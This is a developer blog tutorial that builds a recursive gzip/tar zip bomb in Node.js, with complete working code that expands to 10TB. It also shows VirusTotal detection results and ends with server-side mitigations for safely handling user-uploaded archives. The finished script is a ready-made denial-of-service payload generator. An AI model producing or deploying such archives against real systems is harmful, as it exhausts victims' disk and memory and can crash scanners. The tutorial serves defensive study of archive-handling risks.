---
title: 'ZipBomb in NodeJS: 10TB to 900KB'
date: 2019-08-19 09:07:19
tags:
---

## Intro

#### Harmful of not ?

Depending on who you ask, they might classify zip bombs as malicious files or harmless. Why is that? Well, let's meet Alice and Bob. 

Alice is the new DevOps engineer at her company and she is in charge of migrating their infrastructure to the cloud. She sets up a new AWS instance which is just storing a lot of data for other services to process (so the disk space is the most important resource here). She forgot to enable alerts in case the I/O disk is running low and she disabled autoscaling. A few days later, her ssh key gets compromised, and an attacker gets inside the same AWS instance. He uses a zip bomb to perform a DoS.

On the other hand, meet Bob. Bob is a normal computer user that just downloaded a pirated version of a famous game as an archive and he is trying to install it. During the process, he realises that the unzipping takes a lot of time and soon enough, his disk space is full. Bob must now clean his computer.

#### How were they used in the past?

Usually, malware would hide against the AV behind those zip bombs. The malware would plant those bombs somewhere in the system and wait for the AV to do a routine scan. When the AV would try to unpack, it would find more archive and it will unpack those as well and so on until it will crash (to prevent an Out of Memory error). After the AV would crash, it was "Party on" for the malware which was free to do anything.


#### Motivation for this article

While working for [Countercept](https://www.countercept.com/), I stumbled upon the case where I would have to accept a zip archive as user input and process it in a safe way. To learn how to defend against something, I like to build it first, so we will do that in NodeJS.
In this article, I focused on GZIP(the web uses this, yay) and not on ZIP(which is used by a lot of people, thank you Windows), just because my use case was for the web. Also, I will reference some good resources about GZIP vs ZIP and also about how the web uses GZIP.


---
## Let's get our hands dirty

#### Project setup
```bash
mkdir zipbomb
cd zipbomb
npm init
```
There is only one dependency that you need to install:
```bash
npm install --save tar
```


#### Terminology needed

From a high level perspective, we will only need two things, GZIP and TAR. If you are not sure why you might need both:
* **[GZIP](http://en.wikipedia.org/wiki/Gzip#File_format)** -> compresses a single file into another single file, but does not create archives.
* **[TAR](http://en.wikipedia.org/wiki/Tar_(file_format)#Format_details)**  -> creates a single archived file out of many files, but does not compress them.


#### Strategy used

If you look at examples of ZipBombs, the most famous being [42.zip](https://www.unforgettable.dk/), they use a recursive approach in the sense that at the last level they have the archive which might be on 42MB, but when unzipped, it will expand to 10 GB. We will do the same, the last layer will be the 'harmfull layer', otherwise we will just make copies of the last archive, archive them and so on until we get to the final level. That last layer is usually just made up of "0"s or "null"s.

Now, if you paid attention to the title of the article, I like to be ambitious, so we will make the last layer to contain 100GB when decompressing, but I do not want to store all that on my SSD, so we will use the [Stream API](https://nodejs.org/api/stream.html). If you are not familiar with them, think of them as "pipes in Linux", so as soon as we get new data, we send it across.

#### Start coding

1. The stream that will create the 100GB will be a stream from where we will read data, so we will make that readable. We will also use the gzip functionality from Node in the [zlib](https://nodejs.org/api/zlib.html) module and the [tar](https://www.npmjs.com/package/tar) module that we have installed above. Our imports will look like this.

``` javascript
const fs = require('fs');
const Readable = require('stream').Readable;
const zlib = require('zlib');
const rs = Readable();
const tar = require('tar');
```

2. Let's define our constants. 
    * *wstream* -> We will need to write the archived version of our 100GB to the disk (do not worry, 100GB will result in 100MB) 
    * *levels* -> define how many layers we want in the end
    * *totalSize* -> we will define the total number of bytes that will be written
    * *chunkSize* -> how big the generated chunks will be before we will pass them to the next pipe. (Note: do not set the chunk size too high, because this will be held in memory)
    * *chunkSizeSoFar* -> keep track of how many bytes we have generated so far

```javascript
const fs = require('fs');
const Readable = require('stream').Readable;
const zlib = require('zlib');
const rs = Readable();
const tar = require('tar');


const gzip = zlib.createGzip();
const wstream = fs.createWriteStream('myfile0.gz');
const levels = 2;
const totalSize = 100 * 1024 * 1024 * 1024;
const chunkSize = 50 * 1024 * 1024;
let chunkSizeSoFar = 0;
```

3. I am a lazy person, so I will want to write those sizes in a human-readable form (i.e: 10GB, 1MB). We will create a simple function for this:

```javascript
const fs = require('fs');
const Readable = require('stream').Readable;
const zlib = require('zlib');
const rs = Readable();
const tar = require('tar');


const gzip = zlib.createGzip();
const wstream = fs.createWriteStream('myfile0.gz');
const levels = 2;
const totalSize = calculateSize(100, "GB");
const chunkSize = calculateSize(50, "MB");
let chunkSizeSoFar = 0;


function calculateSize(number, unit) {
    const sizes = {
        "KB": number * Math.pow(1024, 1),
        "MB": number * Math.pow(1024, 2),
        "GB": number * Math.pow(1024, 3),
    }

    return sizes[unit];
}

```
4. Define the Readable stream
    * if we still need to send data we will write a string of size *chunkSize* of '0's (the fastest way to do this will be to use the ES6 [repeat()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/repeat))
    * otherwise, we just signal that we are done sending data

```javascript
const fs = require('fs');
const Readable = require('stream').Readable;
const zlib = require('zlib');
const rs = Readable();
const tar = require('tar');


const gzip = zlib.createGzip();
const wstream = fs.createWriteStream('myfile0.gz');
const levels = 2;
const totalSize = calculateSize(100, "GB");
const chunkSize = calculateSize(50, "MB");
let chunkSizeSoFar = 0;


function calculateSize(number, unit) {
    const sizes = {
        "KB": number * Math.pow(1024, 1),
        "MB": number * Math.pow(1024, 2),
        "GB": number * Math.pow(1024, 3),
    }

    return sizes[unit];
}


rs._read = function () {
    if (totalSize < chunkSizeSoFar - chunkSize) return rs.push(null);

    chunkSizeSoFar += chunkSize
    rs.push("0".repeat(chunkSize));

    console.log(`I am at ${Math.round(chunkSizeSoFar / totalSize * 100)} %.`)
};
```
5. Pipe out the stream to GZIP and write the result to a file

```javascript
const fs = require('fs');
const Readable = require('stream').Readable;
const zlib = require('zlib');
const rs = Readable();
const tar = require('tar');


const gzip = zlib.createGzip();
const wstream = fs.createWriteStream('myfile0.gz');
const levels = 2;
const totalSize = calculateSize(100, "GB");
const chunkSize = calculateSize(50, "MB");
let chunkSizeSoFar = 0;


function calculateSize(number, unit) {
    const sizes = {
        "KB": number * Math.pow(1024, 1),
        "MB": number * Math.pow(1024, 2),
        "GB": number * Math.pow(1024, 3),
    }

    return sizes[unit];
}


rs._read = function () {
    if (totalSize < chunkSizeSoFar - chunkSize) return rs.push(null);

    chunkSizeSoFar += chunkSize
    rs.push("0".repeat(chunkSize));

    console.log(`I am at ${Math.round(chunkSizeSoFar / totalSize * 100)} %.`)
};


rs   // reads from my stream
    .pipe(gzip)  // compresses
    .pipe(wstream)  // writes to myfile0.gz
    .on('finish', function () {  // finished
        console.log('Done initial compressing');
    });
```



#### Pause coding
If you try to run the code so far, you will see it will generate an archive that in reality contains 100GB.
Also, if you want proof that we have generated 100GB :
![prooof](/../posts_resources/ZipBomb-in-NodeJS-10TB-to-900KB/real-size.png)

Before we try to move on to the next step (coping this and making archived of those), we should try and see if we can do anything to generate the file faster and make it smaller.

Spoiler:

```javascript
const gzip = zlib.createGzip();
```

If we look at the documentation for **[zlib](https://nodejs.org/api/zlib.html#zlib_zlib_creategzip_options)**, we can see that there is an option to pass some useful parameters :
   * **level: *(compression only)***
   * **memlevel: *(compression only)***
   * **strategy: *(compression only)***

If you then follow the link to the [low-level API](https://zlib.net/manual.html#Advanced), you can see that we can play with those in our advantage:
   * we can increase the **level** to 9 to get the best compression rate
   * increase the **memlevel** to 9 to use more memory during compression
   * set **strategy** to 3 (3 is Run Length Encoding which will greatly benefit us, as we write the same thing over and over again)




```javascript
const fs = require('fs');
const Readable = require('stream').Readable;
const zlib = require('zlib');
const rs = Readable();
const tar = require('tar');


const gzip = zlib.createGzip({
    level: 9,
    memLevel: 9,
    strategy: 3,
});
const wstream = fs.createWriteStream('myfile0.gz');
const levels = 2;
const totalSize = calculateSize(100, "GB");
const chunkSize = calculateSize(50, "MB");
let chunkSizeSoFar = 0;


function calculateSize(number, unit) {
    const sizes = {
        "KB": number * Math.pow(1024, 1),
        "MB": number * Math.pow(1024, 2),
        "GB": number * Math.pow(1024, 3),
    }

    return sizes[unit];
}


rs._read = function () {
    if (totalSize < chunkSizeSoFar - chunkSize) return rs.push(null);

    chunkSizeSoFar += chunkSize
    rs.push("0".repeat(chunkSize));

    console.log(`I am at ${Math.round(chunkSizeSoFar / totalSize * 100)} %.`)
};


rs   // reads from my stream
    .pipe(gzip)  // compresses
    .pipe(wstream)  // writes to myfile0.gz
    .on('finish', function () {  // finished
        console.log('Done initial compressing');
    });
```



#### Resume coding
Picking up from where we left, we now have the last layer, we just need to duplicate it, compress and repeat until we have reached the final level.
1. Let's try to create a new archive where we duplicate the content of another archive
   * the tar module for node works the same way as the utility tar in Unix/Linux, so we can just pass it a list of file names and it will create an archive out of that 
   * we will use the ES6 [spread operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax) to generate a list of file names (we will use the same file, instead of generating fresh ones, just like when you do a copy-and-paste )
   * the tar module can call gzip for us when it is done, so we will use that, instead of piping it ourselves


```javascript
const fs = require('fs');
const Readable = require('stream').Readable;
const zlib = require('zlib');
const rs = Readable();
const tar = require('tar');


const gzip = zlib.createGzip({
    level: 9,
    memLevel: 9,
    strategy: 3,
    chunkSize: calculateSize(50, "MB") ,
});
const wstream = fs.createWriteStream('myfile0.gz');
const levels = 2;
const totalSize = calculateSize(100, "GB");
const chunkSize = calculateSize(50, "MB");
let chunkSizeSoFar = 0;


function calculateSize(number, unit) {
    const sizes = {
        "KB": number * Math.pow(1024, 1),
        "MB": number * Math.pow(1024, 2),
        "GB": number * Math.pow(1024, 3),
    }

    return sizes[unit];
}


rs._read = function () {
    if (totalSize < chunkSizeSoFar - chunkSize) return rs.push(null);

    chunkSizeSoFar += chunkSize
    rs.push("0".repeat(chunkSize));

    console.log(`I am at ${Math.round(chunkSizeSoFar / totalSize * 100)} %.`)
};


rs   // reads from my stream
    .pipe(gzip)  // compresses
    .pipe(wstream)  // writes to myfile0.gz
    .on('finish', function () {  // finished
        console.log('Done initial compressing');

        const numberOfArchives = 10;
        let modifyFile = 'myfile0.gz';
        let destFile = `myfile${levels + 1}.tgz`;

        tar.c(
            {
                gzip: true
            },
            [...new Array(numberOfArchives).fill(modifyFile)]
        )
            .pipe(fs.createWriteStream(destFile))
            .on('finish', () => {
                console.log('Done second compressing');
            })
    });
```

<!-- It works 🙌🎉 -->
2. We need to repeat the process again, until we have reached the top layer that we defined:

```javascript
const levels = 2;
```
   * we want to do this sequentially so that when **myfile1.tgz** is done, the next step is to make 10 copies of that and then to create **myfile2.tgz**, delete **myfile1.tgz**, then repeat the process. For this we will pack our logic from above in a [Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise):

```javascript
function compressAndBundle(level) {
    const numberOfArchives = 10;

    return new Promise((resolve, reject) => {
        let modifyFile = `myfile${level}.tgz`
        if (level === 0) {
            modifyFile = `myfile${level}.gz`
        }

        let destFile = `myfile${level + 1}.tgz`
        tar.c(
            {
                gzip: true
            },
            [...new Array(numberOfArchives).fill(modifyFile)]
        )
            .pipe(fs.createWriteStream(destFile))
            .on('finish', () => {
                if (level !== 0) {
                    fs.unlinkSync(`./${modifyFile}`);
                }
                resolve(level)
            })


    })
}
```

   * in order to avoid the [callback hell](http://callbackhell.com/), we will make use of a helper function that uses [for ... of](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of) and [async/await](https://javascript.info/async-await):


```javascript
async function process(levels) {
    console.log('Trying to make a bigger archive...')
    for (const level of levels) {
        const res = await compressAndBundle(level);
        console.log(`Finished level ${res}`)
    }
}

``` 
   * we will just need to call the **process(levels)** function and pass it an array like [0,1,2,3] to specify each level

```javascript
const increasing = [...Array(levels).keys()];
        process(increasing)
            .then(res => { console.log('Finished') })
            .catch(err => { console.log(err) })
``` 
---
## Final version of the code

```javascript
const fs = require('fs');
const Readable = require('stream').Readable;
const zlib = require('zlib');
const rs = Readable();
const tar = require('tar');


const gzip = zlib.createGzip({
    level: 9,
    memLevel: 9,
    strategy: 3,
    chunkSize: calculateSize(50, "MB") ,
});
const wstream = fs.createWriteStream('myfile0.gz');
const levels = 2;
const totalSize = calculateSize(100, "GB");
const chunkSize = calculateSize(50, "MB");
let chunkSizeSoFar = 0;


function calculateSize(number, unit) {
    const sizes = {
        "KB": number * Math.pow(1024, 1),
        "MB": number * Math.pow(1024, 2),
        "GB": number * Math.pow(1024, 3),
    }

    return sizes[unit];
}


rs._read = function () {
    if (totalSize < chunkSizeSoFar - chunkSize) return rs.push(null);

    chunkSizeSoFar += chunkSize
    rs.push("0".repeat(chunkSize));

    console.log(`I am at ${Math.round(chunkSizeSoFar / totalSize * 100)} %.`)
};


rs   // reads from my stream
    .pipe(gzip)  // compresses
    .pipe(wstream)  // writes to myfile0.gz
    .on('finish', function () {  // finished
        console.log('Done initial compressing');

        const increasing = [...Array(levels).keys()];
        process(increasing)
            .then(res => { console.log('Finished') })
            .catch(err => { console.log(err) })

    });

function compressAndBundle(level) {
    const numberOfArchives = 10;

    return new Promise((resolve, reject) => {
        let modifyFile = `myfile${level}.tgz`
        if (level === 0) {
            modifyFile = `myfile${level}.gz`
        }

        let destFile = `myfile${level + 1}.tgz`
        tar.c(
            {
                gzip: true
            },
            [...new Array(numberOfArchives).fill(modifyFile)]
        )
            .pipe(fs.createWriteStream(destFile))
            .on('finish', () => {
                if (level !== 0) {
                    fs.unlinkSync(`./${modifyFile}`);
                }
                resolve(level)
            })


    })
}


async function process(levels) {
    console.log('Trying to make a bigger archive...')
    for (const level of levels) {
        const res = await compressAndBundle(level);
        console.log(`Finished level ${res}`)
    }
}


```

---

## Quick analysis

If you run the program without changing anything, you will generate an archive holding 10TB. How?
* Level 1 -> 10 copies of 100 GB = 1TB
* Level 2 -> 10 copies of 1TB = 10TB


I tried to upload the 100GB archive and the final archive to Virus total and those were the results.

##### 100GB file
![100gbfile](/../posts_resources/ZipBomb-in-NodeJS-10TB-to-900KB/virustotal-100gbfile.png)

##### Final archive
![100gbfile](/../posts_resources/ZipBomb-in-NodeJS-10TB-to-900KB/virustotal.png)



I found the results quite interesting, but you also need to bear in mind that by uploading something to virus total, you will not get the same level of feedback as running the full antivirus solution on a real workstation.

## Mitigations
It was fun building one, now how can we make sure that we are not the victims of one?

* Rule 1: NEVER, ever rely on client side validation for security
* Perform server side validations as such:
  * The file size will not exceed the maximum limit
  * The name of the file is safe (it does not contain a symlink or hardlink for directory traversal)
* The process that will do the extraction 
  * should have a limit amount of resources (See [cgroups](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/resource_management_guide/ch01))
  * there should be a limit set for the number of extracted files and the output file size should have a limit as well
* Limit request compression ratios


---


More info:
* [Cool Zip Bomb with no recursion](https://www.extremetech.com/computing/294852-new-zip-bomb-stuffs-4-5pb-of-data-into-46mb-file)
* [The difference between GZIP and ZIP](https://stackoverflow.com/questions/20762094/how-are-zlib-gzip-and-zip-related-what-do-they-have-in-common-and-how-are-they) 
* [How GZIP is used on the web](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/optimize-encoding-and-transfer#text_compression_with_gzip).
